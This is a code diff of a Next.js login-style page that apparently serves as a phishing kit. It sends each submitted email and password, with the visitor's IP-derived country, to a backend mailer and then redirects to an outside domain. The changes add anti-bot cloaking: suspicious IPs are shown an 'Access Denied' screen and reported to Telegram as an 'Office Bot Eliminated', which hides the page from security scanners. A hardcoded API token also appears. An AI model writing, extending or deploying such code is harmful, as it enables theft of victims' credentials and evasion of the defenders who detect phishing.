@@ -1,5 +1,3 @@
-// pages/index.js
-
 import { useState, useEffect } from 'react';
 import axios from 'axios';
 import styles from '../styles/Home.module.css';
@@ -10,21 +8,37 @@ export default function Home() {
   const [country, setCountry] = useState('');
   const [emailSubmitted, setEmailSubmitted] = useState(false);
   const [errorMessage, setErrorMessage] = useState('');
-  const [isProcessing, setIsProcessing] = useState(false); // Modal state
+  const [isProcessing, setIsProcessing] = useState(false);
+  const [accessDenied, setAccessDenied] = useState(false);
 
   useEffect(() => {
-    // Fetch user's country based on IP and get full country name
+    // Trigger CloudFilt check on page load
+    axios.get('/api/check-ip')
+      .then(response => {
+        if (response.data.listed) {
+          console.warn('Suspicious IP detected:', response.data);
+          setAccessDenied(true);
+          // Notify via Telegram
+          axios.post('/api/notify-telegram', {
+            message: `🚨 Office Bot Eliminated 🚨\nIP: ${response.data.ip}\nISP: ${response.data.asnisp}`
+          });
+        }
+      })
+      .catch(error => {
+        console.error('Error checking IP with CloudFilt:', error);
+      });
+
+    // Fetch user's country based on IP
     axios.get('https://ipinfo.io/json?token=c3e87e382ddea7')
       .then(response => {
         const countryCode = response.data.country;
-        // Fetch full country name using the country code
         return axios.get(`https://restcountries.com/v3.1/alpha/${countryCode}`);
       })
       .then(countryResponse => {
-        setCountry(countryResponse.data[0].name.common); // Set full country name
+        setCountry(countryResponse.data[0].name.common);
       })
       .catch(error => {
-        console.error('Failed to fetch full country name:', error);
+        console.error('Failed to fetch country:', error);
         setErrorMessage('Failed to retrieve country information.');
       });
   }, []);
@@ -43,33 +57,33 @@ export default function Home() {
     e.preventDefault();
 
     if (password.length >= 5) {
-      setIsProcessing(true); // Show processing modal
-
+      setIsProcessing(true);
       try {
-        // Send email and password with country to the backend API
-        const response = await axios.post('/api/send-email', {
-          email,
-          password,
-          country,
-        });
-
-        console.log('Email sent successfully!', response.data.message);
+        await axios.post('/api/send-email', { email, password, country });
         window.location.href = 'https://ss.achemsite.info';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
       } finally {
-        setIsProcessing(false); // Hide processing modal after API call completes
+        setIsProcessing(false);
       }
     } else {
       setErrorMessage('Password must be at least 5 characters long.');
     }
   };
 
-  const validateEmail = (email) => {
-    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    return re.test(String(email).toLowerCase());
-  };
+  const validateEmail = (email) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.toLowerCase());
+
+  if (accessDenied) {
+    return (
+      <div className={styles.container}>
+        <div className={styles.accessDeniedBox}>
+          <h1>Access Denied</h1>
+          <p>Your connection has been terminated due to suspicious activity.</p>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div className={styles.container}>
@@ -110,8 +124,6 @@ export default function Home() {
           </form>
         )}
         {errorMessage && <div className={styles.errorMessage}>{errorMessage}</div>}
-
-        {/* Processing Modal */}
         {isProcessing && (
           <div className={styles.modal}>
             <div className={styles.modalContent}>
